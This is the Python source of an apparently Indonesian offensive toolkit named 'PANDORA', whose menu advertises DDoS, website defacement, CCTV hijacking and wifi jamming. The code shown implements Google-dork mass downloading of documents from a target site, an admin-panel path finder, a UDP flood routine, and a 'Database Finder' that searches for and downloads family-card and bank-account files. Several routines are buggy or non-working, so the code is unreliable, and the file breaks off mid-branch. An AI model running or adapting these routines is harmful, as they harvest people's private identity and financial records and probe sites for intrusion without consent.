import sys
try:
    print('')
except SyntaxError as e:
    if e == True:
        print("Hey Idiot, Use python3.")   
import time
try:
    print("Checking For Module..")
except ModuleNotFoundError as e:
    if e == True:
        print('Module Not Found: ', (e))
import time
import os
from os.path import exists
import googlesearch #googlesearch-python
import wget #wget
import urllib.request #urllib
import colorama
from threading import Thread, Lock #threading2
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import scapy #scapy
from colorama import Fore, Style, init
import random
import socket
import requests
import sys
from googlesearch import search
from subprocess import getoutput
from urllib.parse import urlparse
import argparse
import ipaddress
import faker
from faker import Faker
from bs4 import BeautifulSoup
import re
import phonenumbers
from phonenumbers import timezone, geocoder, carrier
from pythonping import ping
import exiftool
import importlib
import socket #new
import threading
import os
import sys
import colorama
import cloudscraper
import random
from colorama import Fore, Back, Style, init
import threading, socket, random, http.client, scapy.all
from scapy.all import IP, TCP, sr1, ARP, Ether, srp

global count
global attack
global user_ip
user_ip = Faker()
ip_addr = user_ip.ipv4()
ip_address = user_ip.ipv6()
MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1


def randomipv4():
    return  ipaddress.IPv4Address._string_from_ip_int(
        random.randint(0, MAX_IPV4)
    )

def randomipv6():
    return ipaddress.IPv6Address._string_from_ip_int(
        random.randint(0, MAX_IPV6)
    )
random.seed(444)
randomipv4()
'79.19.184.109'
randomipv4()
'3.99.136.189'
randomipv4()
'124.4.25.53'
randomipv6()
'4fb7:270d:8ba9:c1ed:7124:317:e6be:81f2'
randomipv6()
'fe02:b348:9465:dc65:6998:6627:1300:29c9'
randomipv6()
'74a:dd88:1ff2:bfe3:1f3:81ad:debd:db88'    
address = randomipv4()
ip6 = randomipv6()

global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
global success, info, fail
success, info, fail = Fore.GREEN + Style.BRIGHT, Fore.YELLOW + \
    Style.BRIGHT, Fore.RED + Style.BRIGHT
    
if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
    os.system('clear')
elif os.name == 'nt':   # Untuk sistem Windows
    os.system('cls')
red = '\033[1;91m'
white = '\033[37m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
red_t = '\033[0;31;40m'
gray = '\033[1;37;40m'

package_name = "adafruit"

try:
    pass
except ImportError or ModuleNotFoundError:
    importlib.import_module(package_name)
    print(info + f"[ + ] Downloading adafruits ! [ + ]")
    os.system('pip3 install adafruit-io')
    os.system('pip install adafruit-circuitpython-adafruitio')
    os.system('pip install adafruit-circuitpython-motor')
    os.system('pip install adafruit-circuitpython-circuitplayground')

print(f"""
{red}                                       @@@@@@@@@%%@@@@@@@@@                        
                                  @@@#-:.              .:-#@@@                    
                             @@@*.                          .*@@@                
                           @@@=.                                .=@@@             
                         @@#.                                      .%@@           
                       @@*                                            *@@         
                      @#.                   ........                   .%@        
                    @@-     -%*.      .:-:--::::::::--:-:.      .*#-     -@@      
                   @@.  .-#@@:     .-:..::. ::.::.:: .::..:-.     :@@*-.  .@@     
                  @%. -@:%@%-   .::::..:.  .-. :: .-.  .-..::::.  .-%@%-@: .%@    
                 @%..-@#=%.%-  .:.   :::-:::...+*-..:::-::.   .:.  -%.%=#@-..%@   
                @@.:=#@--@@- .:.    .:.   .-.+@=:@@.-.   .:.    .:. =@@--@#=: @@  
               @@..@-##@@=  .-.    .-.    .:  .:=@* :.    .-     .-. .=@@##-@..@@ 
               @* *@+*@-=% .--:....:.     :.   :+   .:     .:....:--. %=-@*+@* *@ 
              @@. %@*-+@@. :.  ...:-:::...-    --    -...:::-:...  .:..@@=-#@# .@@
              @#.*-@*#@%. .:      ::     .-...:@@:...-.     :.      :. .%@#*@-+ #@
              @+.@.%#@=-..-.     .-.     .-    ::    :.     .:      .: :-=@#@ @.+@
              @-:@=:@-=@ .-.     .-.     .- -+@@@@+- :.      -.     .-. @=-@.=@:-@
              @-.@@--+@* .----------------#@* .%%. #@#----------------. *@+=-@@.-@
              \033[37m@- +@@:@@. .-.     .-.@@@@@@@@. :==: .@@@@@@@@.-.     .-. :@@:@@+ =@
              @+:.#@*@+--.-.      -%@@@@@@@@.  %%  .@@@@@@@@%:      .: ==+@*@#::+@
              @#.@.-@@.#% .:      :@@@@@@@@@- .@@. -@@@@@@@@@:     .:. %*:@@:.@.#@
              @@.*@*.%.@@  :.  ...=@@@@@@@@@@::@@.:@@@@@@@@@@=...  .:. @@.%.#@+.@@
               @*.+@@+:@@.+.--:.. -@@@@@@@@@@@=@@-@@@@@@@@@@@-...:--.*.@@:+@@+.*@ 
               @@. :@@##@:*%.-.   @@@@@@@@@@@@@@@@@@@@@@@@@@@%   .-.%*:@#%@@: .@@ 
                @@.#-:#@@*:@#.:. .@@@@@@@@@@@@@@@@@@@@@@@@@@@@. .:.#@:#@@#:-# @@  
                 @%.#@=.:%.@@=..::@@@@@@@@@@@@@@@@@@@@@@@@@@@@::..=@@.%:.=@#.@@   
                  @%.:@@@%=:@@:@=-@@@@@@@@@@@@@@@@@@@@@@@@@@@@-=%:@@:=%@@@:.%@    
                   @@. .#@@@%%%:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:%%%@@@#. .@@     
                    @@-.+=..-+*#-%@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-#*+-..=+ -@@      
                      @% .*@@@@@@@@#%@@@@@@@@@@@@@@@@@@@@@@%#@@@@@@@@+..%@        
                       @@*. .:=+*+=:.:*@@@@@@@@@@@@@@@@@@*:.:=+*+=:. .*@@         
                         @@#..+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..%@@           
                           @@@=. .:-:.-@@@@@@@@@@@@@@@@@@-.:-:. .=@@              
                              @@@*.   =@@@@@@@@@@@@@@@@@@=   .*@@@                
                                  @@@##@@@@@@@@@@@@@@@@@@##@@@                    
                                      @@@@@@@@@@@@@@@@@@@@                        
{red}
                ██▓███   ▄▄▄       ███▄    █ ▓█████▄  ▒█████   ██▀███   ▄▄▄      
                ▓██░  ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▒████▄    
                ▓██░ ██▓▒▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  
                ▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ 
                ▒██▒ ░  ░ ▓█   ▓██▒▒██░   ▓██░░▒████▓ ░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒
                ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
                ░▒ ░       ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░
                ░░         ░   ▒      ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
                 ░              ░  ░         ░    ░        ░ ░     ░           ░  ░                       
                                      \033[1;32mCoded By : MrSanZz
                                           V : 3.1.6
                                       Team:JogjaXploit
                                  \033[1;33mhttps://github.com/MrSanZz
""")
time.sleep(0.5)
 #Whoever Recode This Project, You Are Fuck Ass Kid
time.sleep(0.5)
print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
print(f"""{yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
{yellow}│{blue} [01] DUMP {red}[Hot Results]{blue}                               [11] Homework [Only For Homework]         {yellow}│{blue}
{yellow}│{blue} [02] DDOS                                             [12] Executor {red}[Hot Results]{blue}               {yellow}│{blue}
{yellow}│{blue} [03] Admin Finder                                     [13] Ping Site                            {yellow}│{blue}
{yellow}│{blue} [04] Dork                                             [14] Deface {red}[Hot Results]{blue}                 {yellow}│{blue}
{yellow}│{blue} [05] Database Finder {red}[Hot Results]{blue}                    [15] GPT [DELETED !!]                     {yellow}│{blue}
{yellow}│{blue} [06] Admin Bypasser V1 {green}[Fixed]{blue}                        [16] Mass Deface {red}[Hot Results]{blue}            {yellow}│{blue}
{yellow}│{blue} [07] Phone Number Info                                [17] Wifi Jammer {red}[Hot Results]{blue}            {yellow}│{blue}
{yellow}│{blue} [08] DOFOX {red}[Hot Results]{blue}                              [18] Auto XPLOIT {red}[Okay Results]{blue}           {yellow}│{blue}
{yellow}│{blue} [09] Auto Dork                                        [19] Admin Bypasser V2 {green}[Fixed] {red}[Hot]{blue}      {yellow}│{blue}
{yellow}│{blue} [10] CCTV HIJACKER                                    [20] More                                 {yellow}│{blue}
{yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
""")                                     
print('')
print(f'\033[37m')
print(f"╭─[{yellow} PANDORA@localhost {white} ~/home")
answer = input("╰─$ ")
print('\033[1;32m\n')
if answer == ("1"):
    pass
    global domain

    global file_types
    file_types = ['doc', 'dta', 'shx', 'dbf', 'shp', 'db', 'mdf', 'mpd', 'ndb', 'docx', 'docm', 'dot', 'dotx', 'dotm','ppt', 'pptx', 'pps', 'ppsx', 'ppsm', 'pptm', 'potm', 'pot','csv', 'pdf', 'xls', 'xlsx', 'xslsm', 'xlt', 'xltx', 'xltm', 'sql', 'txt']
                   
    print ("""
    ██████▀▀▀░░░░▀▀▀██████
    ███▀░░░░░░░░░░░░░░▀███
    ██│░░░░░░░░░░░░░░░░│██
    █▌│░░░░░░░░░░░░░░░░│▐█
    █░└┐░░░░░░░░░░░░░░░┌┘█
    █░░└┐░░░░░░░░░░░░░┌┘░█
    █░░┌┘▄▄▄▄░░░░▄▄▄▄▄└┐░█
    █▌░│████▌░░░▐█████│░▐█
    ██░│▐█▀▀░░▄░░▀▀██▌│░██
    █▀─┘░░░░░▐█▌░░░░░░└─▀█
    █▄░░▄▄▓░░▀█▀░░▓▄▄▄░░▄█
    █▄─┘██▌░░░░░░░░▐██└─▄█
    ██░░▐█─┬┬┬┬┬┬┬┬─█▌░░██
    █▌░░░▀. |┼.|┼|┼|┼▀ ░▐█
    ██▄░░░└┴┴┴┴┴┴┴┴┘░░▄█ █
    ████▄░░░░░░░░░░░░▄████
    ███████▄▄▄▄▄▄▄████████
    """)
    
    print("…………………../´¯/)       ")
    print("……………….../¯../.      ")
    print("………………../…./.        ")
    print("…………./´¯/’…’/´¯¯`·¸. ")
    print("………./’/…/…./……./¨¯\. ")
    print("……..(‘(…´…´…. ¯~/’…’)")
    print("………\……………..’…../.    ")
    print("…….…\………..... _.·´.  ")
    print("…………\…………..(.        ")
    print("…………..\………….\….      ")

    print("Leaker Mode")
    print("Do Not Use Https")

    print(info + f"-" * 73)
    print("Internet Connection Required : 5MBps (To Optimal The Tools)")
    print(f'\033[1;32mDump Mode')
    target = input("\nTarget Site : ")
    dirt = ("")
    counter = 1
    counter = counter + 1

    os.makedirs(target)

    def download_files(*args):
        # Nama direktori tempat Anda ingin menyimpan file
        target_directory = target
        # Loop melalui argumen (hasil pencarian)
        for result in args:
            # Ekstrak nama file dari URL menggunakan urlparse
            parsed_url = urlparse(results)
            file_name = os.path.basename(parsed_url.path)

            # Gabungkan direktori dengan nama file
            file_path = os.path.join(target_directory, file_name)

            # Unduh file
            response = requests.get(results)

            # Simpan file ke direktori yang ditentukan
            if response == True:
                with open(file_path, "wb") as file:
                    file.write(response.content)

    def dorker():
        request = 0
        path = target
        isdir = os.path.isdir(path)
        if isdir == True:
            pass
        else:
            os.mkdir(target)  
        os.chdir(target)    
    for files in file_types:
       try: 
            file_exists = exists('.google-cookie')
            if file_exists == True:
             os.remove('.google-cookie')
            rand_user = random.choice(user_agents)
            rand_ipv4 = random.choice(address)
            rand_ipv6 = random.choice(ip6)
            print(info + f'\033[1;33m<!> Processing <!>: Searching Info For {files}..')
            for results in search(f'site:{target} filetype:{files}', tld='com', lang='en', num=3, start=0, stop=None, pause=10):
             print(success + f'[+]Found[+] : ')
             print(success + f'\033[1;33m{results}')
             wget.download(results, out=target)
             requ =+ 1
       except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
                 continue
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
                 continue
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
             else:
                 continue    
       except FileExistsError:
           print(fail + f'File {target} Exists.')
       except OSError:
                 continue
       except urllib.error.URLError:
                print(fail + f'[Error] File {files} could not be downloaded. Skipping.')
                continue
       except ModuleNotFoundError:
                print(fail + f'[Error] Did you already install requirements.txt?')
       except UnicodeDecodeError:
                continue 

    print ("Done...")
    print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
    print ("\t\t\033[1;91mExit\n\n")   
    exit()
elif answer == ("2"):
    pass
    print("""\033[1;32m
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ▓█████████████████████████████████████████████████████████████
    ▓█████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    █▓█████████████████████████████████████████▓▓█████████████████
    █▓▓███████████▓▒░░░░░▒▓█████████████████▓▒░░░░▒███████████████
    ▓▒▓██████████▒░░░░░░░░░▒██████████████▓▒░░░░░░░░▓█████████████
    ▒▒██████████▒░░░░░░░░░░░▒█████████████▒░░░░░░░░░░▓████████████
    ▒▓██████████▒░░░░░░░░░░░▒█████████████░░░░░░░░░░░▓██████████▓█
    ▒▒██████████▓░░░░░░░░░░▒▓█████████████▒░░░░░░░░░▒███████████▒▒
    ▒▒███████████▓░░░░░░▒░▒████████████████▒░░░░░░░▒▓██████████▒▒▒
    ▒▒█████████████▓▓▒▒▒▓█████████████████████████████████████▓▒▒▒
    ░░▓██████████████████████████████████████████████████████▒░░▒▒
    ░░░▓████████████████████████████████████████████████████▒░░░░░
    ░░░░▓██████████████████████████████████████████████████░░░░░░░
    ░░░░░▒███████████████████████████████████████████████▒░░░░░░░░
    ░░░░░░░░▒▓██████████████████████████████████████████░░░░░░░░░░
    ░░░░░░░░░░▒█████▓██████████████████████████▓▒▒█████▓░░░░░░░░░░
    ░░░░░░░░░░░▒█████▓░▒▒▓██████████████▓▓▓▒▒░░░░█████▓░░░░░░░░░░░
    ░░░░░░░░░░░░▓███████▒░░░░░░░░░░░░░░░░▒░░░░░▓█████▓░░░░░░░░░░░░
    ░░░░░░░░░░░░░▓████████▓▒▒░░░░░░░░░░░░░░▒▓███████▒░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░▒▓███████████▓▓▒▒▒▒▒▓▓██████████▓░░░░░░░░░░░░░░░
    ▒▒▒▒▒▒▒░░░▒▒▒▒▒▒▒▓██████████████████████████▓░░░░░░░░░░░░░░▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓██████████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓████████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """)
    time.sleep(0.5)
    print(f'\033[1;34mDDOS MODE')
    targt = input(f"\nIP TARGET : ")
    prot = int(input("Port : "))
    size = int(input("Byte Size : "))
    time.sleep(0.5)
    print("Please Wait...")
    time.sleep(0.5)
    try:
        def dstroy(targt, prot, size, duration):
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = size
            sent = 5000
            
            while dstroy:
                pass
                client.sendto(bytes (targt, prot))
                sent = sent + 1
                
        while True:     
            pass
            print(info + f'Sending {size} Bytes To {targt}')
    except KeyboardInterrupt:
        print("Interrupt Detected , Exit ")
        exit()         
elif answer.startswith("3"):
    print("""\033[1;33m
    ⠀⠀⠀⢀⢾⠋⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⢸⠒⢲⢌⣎⢢⠀⠀⠀
   ⠀⠀⡠⠃⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠞⠀⠀⠀⠀⠀⠱⡀⠀
   ⠀⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢤⠔⠲⡖⠀⠀⠀⠐⠒⢤⠀⠀⠀⠀⠀⠱⠀
   ⢀⠃⠀⠀⠀⠀⠀⠀⢀⡠⠒⣁⡰⠹⢒⠃⠇⢰⠀⠀⠀⠢⡀⠱⡀⠀⠀⠀⠀⠇
   ⠘⠀⠀⠀⠀⠀⢀⣔⠥⡲⠉⠜⢀⣀⡌⠀⡆⢸⣀⠀⠀⠆⠈⢄⠱⡀⠀⠀⠀⢀
   ⠀⠀⠀⠀⢀⡴⠋⡑⠠⢡⠎⠀⠀⢸⠀⠀⢠⠋⡄⠀⠰⡇⣾⠈⣢⠱⠀⠀⠀⠀
   ⠀⠀⠀⢠⠋⢠⠀⣇⠆⠘⢶⣤⣀⡠⠄⠀⠘⠀⡇⢠⠃⡷⢄⡄⠇⠱⡇⠀⠀⠘
   ⠀⠀⣰⠁⠀⠈⣆⣹⠀⠀⠸⣄⣨⡿⠃⠀⠀⢀⡵⣅⣈⠀⠀⣽⠁⠀⢻⠀⠀⠆
   ⠀⣰⣿⠀⠀⠀⢹⣾⠀⠀⠀⠈⠁⠀⠀⠀⠀⠈⠀⠩⡟⠲⢦⣵⠀⡄⣸⠀⡜⠀
   ⢀⣿⣿⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠴⠞⠑⣰⢃⢿⡸⠁⠀
   ⣸⣿⣿⣇⠀⠀⢸⠣⡀⠀⠀⢀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⡸⢊⣼⠇⠀⠀
   ⣿⣿⣿⡿⠀⠀⢸⡄⡗⢄⠀⠈⠄⣀⣙⡶⠀⠀⠀⠀⠀⢠⠟⡝⡡⡻⢹⠀⠀⠀
   ⠹⣿⣿⠃⠀⠀⢸⣷⢳⠀⠑⢄⠀⠀⠀⠀⢀⣀⣀⠤⢒⠝⢇⡴⠛⠁⢸⠀⠀⠀
   ⡄⢸⠃⠀⠀⠀⣿⣿⡌⠀⠀⠀⠈⣉⠽⠵⣿⠃⢀⠔⠁⢸⠋⣀⣠⣤⡼⠀⠀⠀
   ⠈⠛⠀⠀⠀⢸⣀⡈⠷⣀⣀⡔⠉⢠⠤⠔⢺⡴⠁⠀⢀⠟⠛⢻⣿⠿⠃⠀⠀⠀
    """)
    print("\033[1;32mADMIN FINDER")
    print("(Beta)")
    print("How To Write The URL Target : https://site.com")
    website_url = input("\nTarget Site [Use HTTPS]: ")
    admin_paths = ['/admin/', '/admin/dashboard/', '/admin/login.php/', '/wp-admin/', '/login.php/', '/wp-admin.php/', '/wp-admin/index.php', '/admin/dashboard.html/', '/admin.html/', '/admin/', '/usuarios/', '/cpanel.php/', '/cpanel/', '/cpanel.htm/', '/controlpanel/', '/admin/upload.php/', '/wp-login.php/', '/administrator/', '/admin/add.php/', '/dashboard/', '/admin/dashboard/', '/admin/dashboard.php/', '/panel/', '/admin/panel/', '/adminpanel/', '/admin/controlpanel/', '/admin/cpanel/', '/admin/dashboard.php/', '/admin.html/', '/admin.php/', '/admin/cpanel.php/', '/admin/cp.php/', '/adm', '/administrator/index.html', '/panelcontrol', '/dash', '/admin/dash.php']
    
    for result in admin_paths:
        file_exists = ('.google-cookie')
        if file_exists == True:
            os.remove(file_exists)
        print(f'Searching Admin Page..')
        url = website_url + result
        response = requests.get(url)
        if response.status_code == 200:
            print(info + f'Found ! ')
            print(response)
            print(url)
        else:
            print(fail + f'Cant Find Admin Page')    
elif answer.startswith("4"):
    try:
        resultdork = input("Would you want to save the project? Y/N :")
        loges = ("")
    
    except KeyboardInterrupt:
        print("\n")   
        print("interrupt detected")
        sys.exit()
    
    def logger(resultdork):
        file = open((loges) + ".txt", "a")
        file.write(str(resultdork))
        file.write("\n")
        file.close()
    
    if resultdork.startswith("y" or "Y"):
        print("\n")
        loges = input("Name : ")
        logger(resultdork)
    else:
        print("Skipped")    
    try:    
                  dork = input("\nDork : ")
                  numr = input("Number Result 1-100 : ")
    
                  requ = 0
                  counter = 0    
    
                  for results in search(dork,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                       rand_user = random.choice(user_agents)
                       counter = counter + 1
                       print("<!>Found<!> : ", results, counter)
                       time.sleep(0.5)
                       requ += 1
                       if requ >= int(numr):
                           break
    except urllib.error.HTTPError as e:
                       if e.code == 429:
                           print(fail + f' [429] Error, Try Again Later.')
                           
                           quit()    
                       resultdork = (counter, results)
     
                       logger(resultdork)
                       time.sleep(0.2)
                       
    print ("Done.")
    print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
    print ("\t\t\033[1;91mExit\n\n")
    exit()
elif answer.startswith("5"):
    time.sleep(0.5)
    print("""\033[1;91m
       
   ▓█████▄  ▄▄▄     ▄▄▄█████▓ ▄▄▄           █████▒██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  
   ▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▒████▄       ▓██   ▒▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
   ░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄     ▒████ ░▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒
   ░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██    ░▓█▒  ░░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
   ░▒████▓  ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒   ░▒█░   ░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒
    ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░    ▒ ░   ░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░ ▒  ▒   ▒   ▒▒ ░   ░      ▒   ▒▒ ░    ░      ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
    ░ ░  ░   ░   ▒    ░        ░   ▒       ░ ░    ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ 
       ░          ░  ░              ░  ░           ░           ░    ░       ░  ░   ░     
    ░                                                            ░                      
    """)
    time.sleep(0.5)
    db1 = ['xls', 'pdf', 'csv', 'kartu-keluarga.pdf', 'kk.pdf', 'kk.xls', 'kk.xlsx', 'kk.csv', 'database/kk.pdf', 'admin/data/kk.pdf', 'kartukeluarga.pdf', 'pdf/kk.pdf', 'kk.csv', 'kartukeluarga.csv', 'admin/csv/kk.csv', 'database/kk.csv', 'admin/dataset/kk.csv', 'csv/kk.csv', 'kk.xls', 'database/kk.xls', 'admin/data/kk.xls', 'xls/kk.xls']
    db2 = ['xls', 'pdf', 'csv', 'rekening.pdf', 'rekening.xls', 'rekening.xlsx', 'rekening.csv', 'database/rekening.pdf', 'admin/data/rekening.pdf', 'rekening.pdf', 'pdf/rekening.pdf', 'rekening.csv', 'rekening.xlsx', 'admin/csv/rekening.csv', 'database/rekening.csv', 'admin/dataset/rekening.csv', 'csv/rekening.csv', 'rekening.xls', 'database/rekening.xls', 'admin/data/rekening.xls', 'xls/rekening.xls']
    print("\033[1;33m-" * 22)
    print("Database Finder")
    print("1. KartuKeluarga Finder")
    print("2. Rekening Finder")
    print("3. Custom Finder")
    print("4. Find With Dork [MainTenance]")
    dabass = input("choice : ")
    
    if dabass.startswith("1"):
        try:
            trgt = input(f'\nTarget : ')
            os.makedirs(trgt)
            for data in db1:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 rand_ipv4 = random.choice(address)
                 rand_ipv6 = random.choice(ip6)
                 rand_user = random.choice(user_agents)
                 print(info + f'\033[1;33m<!> Processing <!>: Searching Info For KK..')
                 for kk in search(f'site:{trgt} filetype:{data}', tld='com', num=int(f'{req}'), start=0, stop=None):
                     print(success + f'[ + ] Found ! [ + ]')
                     print(success + f'{kk}')
                     wget.download(kk, out=trgt)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("2"):
        try:
             trgt2 = input(f'\nTarget : ')
             os.makedirs(trgt2)
             for datas in db2:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 print(info + f'\033[1;33m<!> Processing <!>: Searching Info For Rekening')
                 for rekeng in search(f'site:{trgt2} filetype:{datas}', tld="com", num=int(f'{req}'), start=0, stop=None):
                     print(success + f'[ + ] Found ! [ + ]')
                     print(success + f'{rekeng}')
                     wget.download(rekeng, out=trgt2)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("3"):
        try:
             db_types = input("Database Types [Example : SimCard]: ")
             trgt3 = input(f'\nTarget : ')
             os.makedirs(trgt3)
             db3 = ["xls", "pdf", "csv", f"{db_types}.pdf", f"{db_types}.xls", f"{db_types}.xlsx", f"{db_types}.csv", f"{db_types}" f"admin/database/{db_types}.pdf", f"database/{db_types}.pdf", f"admin/data/{db_types}.pdf", f"{db_types}.pdf", f"pdf/{db_types}.pdf", f"{db_types}.csv", f"{db_types}.xlsx", f"admin/csv/{db_types}.csv", f"database/{db_types}.csv", f"admin/dataset/{db_types}.csv", f"csv/{db_types}.csv", f"{db_types}.xls", f"database/{db_types}.xls", f"admin/data/{db_types}.xls", f"xls/{db_types}.xls"]
             for datase in db3:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 print(info + f'\033[1;33m<!> Processing <!>: Searching Info For {db_types}..')
                 for databases in search(f'site:{trgt3} filetype:{datase}', tld="com", num=int(f'{req}'), start=0, stop=None):
                     print(success + f'[ + ] Found ! [ + ]')
                     print(success + f'{databases}')
                     wget.download(databases, out=trgt3)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("4"):
        try:
